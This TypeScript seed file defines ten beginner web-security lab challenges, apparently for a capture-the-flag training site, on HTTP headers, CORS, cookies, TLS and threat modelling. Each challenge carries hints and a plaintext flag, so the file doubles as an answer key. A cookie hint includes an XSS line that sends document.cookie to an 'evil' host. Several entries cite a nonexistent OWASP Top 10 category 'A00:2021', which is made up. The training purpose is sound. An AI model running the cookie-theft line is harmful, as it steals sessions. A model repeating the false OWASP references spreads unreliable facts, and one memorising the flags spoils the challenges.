import { ChallengeDifficulty, ChallengeStatus } from '@prisma/client';
import { ChallengeSeedData } from '../challenges-data';

export const FOUNDATIONS_CHALLENGES: ChallengeSeedData[] = [
  {
    title: 'HTTP/2 & Request Header Semantics Inspection',
    slug: 'http2-header-semantics-lab',
    categorySlug: 'foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    points: 25,
    status: ChallengeStatus.PUBLISHED,
    description:
      'Inspect HTTP/1.1 and HTTP/2 pseudo-headers (:method, :path, :authority, Host) to diagnose header normalization mismatches and capture a diagnostic response header.',
    instructions:
      'Use your browser Network tab or curl --http2 to inspect the request/response headers on /api/v1/health and locate the custom X-Foundations-Trace token.',
    objectives:
      'Understand HTTP request lines, HTTP/2 binary frames and pseudo-headers per RFC 9110 & RFC 9113, and how proxies forward Host/:authority.',
    flag: 'WEBSEC{http2_pseudo_headers_rfc9113_understood}',
    hints: [
      {
        title: 'Inspect HTTP Response Headers',
        content: 'Open DevTools -> Network -> select the document/API call and inspect Response Headers (X-* metadata).',
        costPoints: 0,
        order: 1,
      },
      {
        title: 'Compare HTTP/1.1 Host vs HTTP/2 :authority',
        content: 'In HTTP/2 (RFC 9113), the classic Host header is replaced by the mandatory :authority pseudo-header.',
        costPoints: 5,
        order: 2,
      },
      {
        title: 'Check Content-Type & X-Content-Type-Options',
        content: 'Verify both Content-Type and X-Content-Type-Options: nosniff are present so browsers do not MIME-sniff payloads.',
        costPoints: 10,
        order: 3,
      },
    ],
    references: ['IETF_RFC:RFC-9110', 'IETF_RFC:RFC-9113', 'NIST:SP-800-95', 'OWASP_ASVS:V14'],
  },
  {
    title: 'HTTP Method Safety & Verb Tampering Basics',
    slug: 'http-method-verb-safety-lab',
    categorySlug: 'foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    points: 25,
    status: ChallengeStatus.PUBLISHED,
    description:
      'Discover why exposing state-changing operations via GET or relying on incomplete HTTP method allowlists leads to silent security bypasses.',
    instructions:
      'Send an OPTIONS preflight or alternate HTTP method (PUT/POST/HEAD) against the status endpoint to test how method routing responds.',
    objectives:
      'Distinguish safe methods (GET, HEAD, OPTIONS) from idempotent and unsafe state-changing methods (POST, PUT, PATCH, DELETE) per RFC 9110.',
    flag: 'WEBSEC{safe_idempotent_http_methods_rfc9110}',
    hints: [
      {
        title: 'Discover Allowed Methods with OPTIONS',
        content: 'Run curl -i -X OPTIONS on the target endpoint to inspect the Allow header returned by the server.',
        costPoints: 0,
        order: 1,
      },
      {
        title: 'Test GET vs POST State Changes',
        content: 'Never allow password resets, deletes, or privilege toggles on HTTP GET, which can be triggered by an <img> tag or link prefetch.',
        costPoints: 5,
        order: 2,
      },
      {
        title: 'Audit Auth Middleware Scope',
        content: 'Ensure middleware covers app.all / router.use rather than only router.get() or router.post().',
        costPoints: 10,
        order: 3,
      },
    ],
    references: ['IETF_RFC:RFC-9110', 'OWASP_TOP_10:A00:2021', 'OWASP_TOP_10:A01:2021'],
  },
  {
    title: 'OWASP Top 10 & CVSS Risk Classification Lab',
    slug: 'owasp-top10-taxonomy-lab',
    categorySlug: 'foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    points: 50,
    status: ChallengeStatus.PUBLISHED,
    description:
      'Connect global cybersecurity taxonomies accurately: map sample vulnerabilities across OWASP Top 10 (A00:2021–A10), CWE, CVE, CVSS v3.1 vectors, OWASP WSTG, and NIST SP 800-95.',
    instructions:
      'Decode a CVSS v3.1 vector (AV:N/AC:L/PR:N/UI:N) and distinguish OWASP Top 10 risk themes from CWE coding weaknesses and CVE instances.',
    objectives:
      'Classify web findings accurately using OWASP Top 10:2021 (A00:2021), OWASP ASVS, CWE, CVSS v3.1, and NIST SP 800-95.',
    flag: 'WEBSEC{owasp_a00_cwe_cvss_taxonomy_decoded}',
    hints: [
      {
        title: 'Distinguish OWASP vs CWE vs CVE',
        content: 'OWASP Top 10 = High-level risk category; CWE = Root coding weakness class; CVE = Specific disclosed product bug instance.',
        costPoints: 0,
        order: 1,
      },
      {
        title: 'Read the CVSS Attack Vector',
        content: 'AV:N means Network-exploitable remotely; PR:N means no login required; UI:N means no victim click required.',
        costPoints: 10,
        order: 2,
      },
      {
        title: 'Verify Baseline Controls With ASVS & WSTG',
        content: 'Use OWASP ASVS when engineering features and OWASP WSTG v4.2 when testing for flaws.',
        costPoints: 15,
        order: 3,
      },
    ],
    references: ['OWASP_TOP_10:A00:2021', 'NIST:SP-800-95', 'OWASP_ASVS:V1'],
  },
  {
    title: 'TLS Handshake, HTTPS & HSTS Transport Protection',
    slug: 'tls-https-transport-basics-lab',
    categorySlug: 'foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    points: 50,
    status: ChallengeStatus.PUBLISHED,
    description:
      'Examine how TLS certificates, ALPN protocol negotiation, and Strict-Transport-Security (HSTS) protect web traffic from passive sniffing and SSL stripping.',
    instructions:
      'Inspect the Strict-Transport-Security policy header and verify how downgrade attacks operate before HSTS max-age takes effect.',
    objectives:
      'Understand encryption in transit, server certificate authentication, mixed content risks, and HSTS preload directives per NIST SP 800-95 and OWASP A02:2021.',
    flag: 'WEBSEC{tls_hsts_transport_integrity_verified}',
    hints: [
      {
        title: 'Check Why HTTP Redirects Are Not Enough',
        content: 'An attacker on public Wi-Fi can intercept the very first plaintext http:// request before a 301 redirect reaches the user.',
        costPoints: 0,
        order: 1,
      },
      {
        title: 'Inspect HSTS Directives',
        content: 'Look for Strict-Transport-Security: max-age=31536000; includeSubDomains; preload.',
        costPoints: 10,
        order: 2,
      },
      {
        title: 'Prevent Mixed Content',
        content: 'Loading one insecure http:// script inside an https:// page allows an attacker to hijack the entire HTTPS DOM.',
        costPoints: 15,
        order: 3,
      },
    ],
    references: ['OWASP_TOP_10:A02:2021', 'NIST:SP-800-95', 'OWASP_ASVS:V14'],
  },
  {
    title: 'Same-Origin Policy (SOP) Tuple Analysis',
    slug: 'same-origin-policy-boundaries-lab',
    categorySlug: 'foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    points: 50,
    status: ChallengeStatus.PUBLISHED,
    description:
      'Test which URLs share a browser Origin (scheme, host, port) and understand what cross-origin actions SOP blocks versus permits.',
    instructions:
      'Compare pairs of URLs against https://portal.websec.local:443 to determine same-origin compatibility and read-vs-write rules.',
    objectives:
      'Master the browser Same-Origin Policy (SOP) tuple rule and explain why cross-origin reads are blocked while simple writes remain allowed.',
    flag: 'WEBSEC{same_origin_tuple_scheme_host_port}',
    hints: [
      {
        title: 'Check All Three Components',
        content: 'An Origin is strictly (scheme, host, port). Changing http vs https, subdomain, or port creates a different origin.',
        costPoints: 0,
        order: 1,
      },
      {
        title: 'Read vs Embed/Write Asymmetry',
        content: 'SOP blocks reading cross-origin responses in fetch(), but historically allows loading <img>, <script>, and submitting <form>.',
        costPoints: 10,
        order: 2,
      },
      {
        title: 'Sandboxed Iframes Use Opaque Origin null',
        content: 'An <iframe sandbox> without allow-same-origin gets an isolated opaque origin that cannot touch parent cookies or DOM.',
        costPoints: 15,
        order: 3,
      },
    ],
    references: ['OWASP_TOP_10:A00:2021', 'OWASP_ASVS:V14', 'NIST:SP-800-95'],
  },
  {
    title: 'CORS Preflight & Reflected Origin Audit',
    slug: 'cors-preflight-trust-flaws-lab',
    categorySlug: 'foundations',
    difficulty: ChallengeDifficulty.EASY,
    points: 75,
    status: ChallengeStatus.PUBLISHED,
    description:
      'Audit a Cross-Origin Resource Sharing (CORS) endpoint that dynamically reflects the incoming Origin header alongside Access-Control-Allow-Credentials: true.',
    instructions:
      'Inspect OPTIONS preflight negotiation and test whether sending an untrusted Origin: https://attacker.example reflects back into Access-Control-Allow-Origin.',
    objectives:
      'Understand CORS simple vs preflight OPTIONS requests and prevent dangerous reflected-origin and Origin: null misconfigurations.',
    flag: 'WEBSEC{cors_strict_allowlist_no_origin_reflection}',
    hints: [
      {
        title: 'Spot the Anti-Pattern',
        content: 'Browsers reject ACAO: * with ACAC: true, so insecure servers mirror req.headers.origin directly—which is equally fatal.',
        costPoints: 0,
        order: 1,
      },
      {
        title: 'Never Whitelist Origin: null',
        content: 'Sandboxed iframes and local HTML files send Origin: null automatically—an attacker can forge null from anywhere.',
        costPoints: 15,
        order: 2,
      },
      {
        title: 'Verify Exact Origin Allowlist + Vary: Origin',
        content: 'Validate Origin against an exact Set allowlist and always return Vary: Origin so CDNs do not poison cached CORS headers.',
        costPoints: 25,
        order: 3,
      },
    ],
    references: ['OWASP_TOP_10:A05:2021', 'OWASP_TOP_10:A01:2021', 'OWASP_ASVS:V14'],
  },
  {
    title: 'RFC 6265 Cookie Security Flag Audit',
    slug: 'rfc6265-cookie-flags-lab',
    categorySlug: 'foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    points: 50,
    status: ChallengeStatus.PUBLISHED,
    description:
      'Audit Set-Cookie response headers against IETF RFC 6265 and identify missing HttpOnly, Secure, and SameSite protections on session identifiers.',
    instructions:
      'Inspect cookie attributes on the simulated login Set-Cookie header and verify how __Host- prefixes prevent subdomain cookie tossing.',
    objectives:
      'Configure HttpOnly, Secure, SameSite=Lax/Strict, Domain/Path scoping, and __Host- prefixes accurately per RFC 6265 and OWASP ASVS V3.',
    flag: 'WEBSEC{rfc6265_httponly_secure_samesite_enforced}',
    hints: [
      {
        title: 'Check document.cookie Accessibility',
        content: 'Without HttpOnly, any XSS script can execute fetch("https://evil/?c=" + document.cookie) to steal the session token.',
        costPoints: 0,
        order: 1,
      },
      {
        title: 'SameSite Blocks CSRF Writes',
        content: 'SameSite=Lax blocks session cookies on cross-site POST forms while preserving normal top-level link navigation.',
        costPoints: 10,
        order: 2,
      },
      {
        title: 'Use __Host- Prefix for Sensitive Sessions',
        content: '__Host-session enforces Secure, Path=/, and no Domain attribute—locking the cookie strictly to that exact host.',
        costPoints: 15,
        order: 3,
      },
    ],
    references: ['IETF_RFC:RFC-6265', 'OWASP_ASVS:V3', 'OWASP_TOP_10:A07:2021'],
  },
  {
    title: 'Browser Storage & Session Token Boundary',
    slug: 'browser-storage-session-basics-lab',
    categorySlug: 'foundations',
    difficulty: ChallengeDifficulty.EASY,
    points: 50,
    status: ChallengeStatus.PUBLISHED,
    description:
      'Compare HttpOnly Cookies, localStorage, and sessionStorage for authentication token storage and verify why session identifiers must rotate on login.',
    instructions:
      'Audit browser storage exposure across DevTools Application -> Storage and check session invalidation behaviors on logout.',
    objectives:
      'Evaluate browser token storage tradeoffs, XSS exfiltration risk in Web Storage, and OWASP ASVS V3 session lifecycle controls.',
    flag: 'WEBSEC{httponly_cookie_beats_localstorage_for_tokens}',
    hints: [
      {
        title: 'Why localStorage Is Vulnerable to XSS',
        content: 'Every third-party script or analytics tag running on the origin can call localStorage.getItem("token") directly.',
        costPoints: 0,
        order: 1,
      },
      {
        title: 'Logout Must Invalidate Server-Side',
        content: 'Clearing a token only in the browser leaves a stolen JWT or session ID valid until expiry unless tracked/revoked server-side.',
        costPoints: 10,
        order: 2,
      },
      {
        title: 'Regenerate Session ID on Privilege Change',
        content: 'Rotating the session ID upon login prevents Session Fixation attacks where an attacker pre-sets a known ID.',
        costPoints: 15,
        order: 3,
      },
    ],
    references: ['IETF_RFC:RFC-6265', 'OWASP_ASVS:V3', 'OWASP_TOP_10:A07:2021'],
  },
  {
    title: 'Intercepting Proxy & Client-Header Tampering',
    slug: 'web-proxy-interception-lab',
    categorySlug: 'foundations',
    difficulty: ChallengeDifficulty.EASY,
    points: 50,
    status: ChallengeStatus.PUBLISHED,
    description:
      'Learn how intercepting proxies (Burp Suite, OWASP ZAP) inspect HTTPS traffic via CONNECT tunnels and modify client-side fields after browser validation runs.',
    instructions:
      'Trace how a proxy intercepts POST requests before they hit the network and understand why disabled inputs or JS checks are trivially bypassed.',
    objectives:
      'Explain HTTP CONNECT TLS interception and enforce all validation, authorization, and business rules strictly server-side per NIST SP 800-95.',
    flag: 'WEBSEC{never_trust_client_never_skip_server_validation}',
    hints: [
      {
        title: 'Browser Validation Only Helps Honest Users',
        content: 'An intercepting proxy pauses the HTTP request AFTER JavaScript finishes executing and lets you rewrite any JSON field or header.',
        costPoints: 0,
        order: 1,
      },
      {
        title: 'Understand Proxy Root CA Installation',
        content: 'To decrypt HTTPS traffic between your browser and Burp/ZAP, you install the proxy local Root CA so it can issue leaf certs on the fly.',
        costPoints: 10,
        order: 2,
      },
      {
        title: 'Replay Requests in Repeater',
        content: 'Pentesters capture one baseline request and replay modified headers, roles, and prices directly from proxy Repeater tools.',
        costPoints: 15,
        order: 3,
      },
    ],
    references: ['NIST:SP-800-95', 'OWASP_TOP_10:A04:2021', 'OWASP_ASVS:V1'],
  },
  {
    title: 'OWASP Top 10 & ASVS V1 Threat Modeling Assessment',
    slug: 'owasp-threat-modeling-a00-lab',
    categorySlug: 'foundations',
    difficulty: ChallengeDifficulty.BEGINNER,
    points: 50,
    status: ChallengeStatus.PUBLISHED,
    description:
      'Apply Shostack Four Questions, STRIDE, Trust Boundaries, OWASP A00:2021, CWE, CVSS v3.1, and ASVS V1 to classify real web application risks before writing code.',
    instructions:
      'Map application Trust Boundaries from Browser -> CDN -> API -> Database and identify the matching OWASP Top 10 and CWE classifications.',
    objectives:
      'Build repeatable threat models using Data Flow Diagrams, STRIDE, OWASP A00:2021 taxonomy, NIST SP 800-95, and ASVS V1 verification controls.',
    flag: 'WEBSEC{owasp_a00_asvs_v1_stride_threat_model_mastered}',
    hints: [
      {
        title: 'Find Every Trust Boundary',
        content: 'Whenever data crosses from Browser to API, API to Admin Panel, or API to Internal Microservice, a Trust Boundary exists.',
        costPoints: 0,
        order: 1,
      },
      {
        title: 'Distinguish OWASP vs CWE vs CVE',
        content: 'OWASP Top 10 = High-level risk category; CWE = Root coding weakness class; CVE = Specific disclosed bug instance.',
        costPoints: 10,
        order: 2,
      },
      {
        title: 'Verify Controls With OWASP ASVS V1',
        content: 'ASVS Level 1 covers essential baseline security for all web apps; Level 2/3 cover sensitive financial and critical workloads.',
        costPoints: 15,
        order: 3,
      },
    ],
    references: ['OWASP_TOP_10:A00:2021', 'OWASP_ASVS:V1', 'NIST:SP-800-95'],
  },
];
